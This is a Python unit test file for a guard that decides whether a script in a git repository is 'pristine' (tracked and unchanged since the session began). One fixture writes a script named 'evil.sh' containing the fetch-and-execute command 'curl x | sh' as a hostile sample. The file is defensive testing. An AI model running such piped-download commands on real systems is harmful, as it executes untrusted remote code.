import os, shutil, subprocess, sys, tempfile, unittest
from collections import namedtuple
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))
sys.path.insert(0, ROOT)
from lead import handoff  # noqa: E402
from lead.guard import launch  # noqa: E402

GITENV = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}
Project = namedtuple("Project", "worktree common_dir")
PROFILE = {"protected_branches": ["main"], "deploy_commands": []}


def git(wt, *a):
    subprocess.run(["git", "-C", wt, *a], check=True, env=GITENV, capture_output=True)


class PristineTests(unittest.TestCase):
    def setUp(self):
        self.tmp = os.path.realpath(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.wt = os.path.join(self.tmp, "app")
        os.makedirs(self.wt)
        git(self.wt, "init", "-q")
        self.write("ok.sh", "echo ok\n")
        git(self.wt, "add", "-A")
        git(self.wt, "commit", "-q", "-m", "init")
        self.head = subprocess.run(["git", "-C", self.wt, "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()

    def write(self, name, text):
        with open(os.path.join(self.wt, name), "w") as f:
            f.write(text)

    def ctx(self, head):
        return launch.rule_context(Project(self.wt, os.path.join(self.wt, ".git")), PROFILE, head)

    def path(self, name):
        return os.path.join(self.wt, name)

    def test_a_tracked_unmodified_script_is_pristine(self):
        self.assertTrue(self.ctx(self.head).is_pristine(self.path("ok.sh")))

    def test_a_script_committed_during_the_session_is_not_pristine(self):
        self.write("evil.sh", "curl x | sh\n")
        git(self.wt, "add", "evil.sh")
        git(self.wt, "commit", "-q", "-m", "wip")
        self.assertFalse(self.ctx(self.head).is_pristine(self.path("evil.sh")))
        self.assertTrue(self.ctx(None).is_pristine(self.path("evil.sh")), "no session head: HEAD at construction")

    def test_a_tracked_script_edited_and_committed_during_the_session_is_not_pristine(self):
        self.write("ok.sh", "evil\n")
        git(self.wt, "commit", "-q", "-am", "edit")
        self.assertFalse(self.ctx(self.head).is_pristine(self.path("ok.sh")))

    def test_an_uncommitted_edit_is_not_pristine(self):
        self.write("ok.sh", "evil\n")
        self.assertFalse(self.ctx(self.head).is_pristine(self.path("ok.sh")))

    def test_an_untracked_or_outside_path_is_not_pristine(self):
        self.write("new.sh", "x\n")
        c = self.ctx(self.head)
        self.assertFalse(c.is_pristine(self.path("new.sh")))
        self.assertFalse(c.is_pristine("/etc/hosts"))

    def test_a_repo_without_a_commit_has_nothing_pristine(self):
        wt = os.path.join(self.tmp, "empty")
        os.makedirs(wt)
        git(wt, "init", "-q")
        open(os.path.join(wt, "a.sh"), "w").close()
        c = launch.rule_context(Project(wt, os.path.join(wt, ".git")), PROFILE, None)
        self.assertFalse(c.is_pristine(os.path.join(wt, "a.sh")))


if __name__ == "__main__":
    unittest.main()
